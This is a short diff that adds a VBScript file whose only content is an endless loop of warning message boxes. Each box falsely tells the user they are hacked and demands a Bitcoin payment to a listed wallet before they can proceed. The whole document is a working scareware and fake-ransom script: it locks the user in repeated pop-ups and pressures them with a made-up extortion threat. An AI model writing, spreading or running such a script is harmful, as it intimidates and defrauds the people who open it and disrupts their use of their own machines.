@@ -1,0 +1,3 @@
+do
+x=msgbox("You are hacked, pay 0.345 BTC to proceed. wallet BTEC1122SD54FG4. Press OK to pay", 0+48, "Urgent Warning!")
+loop
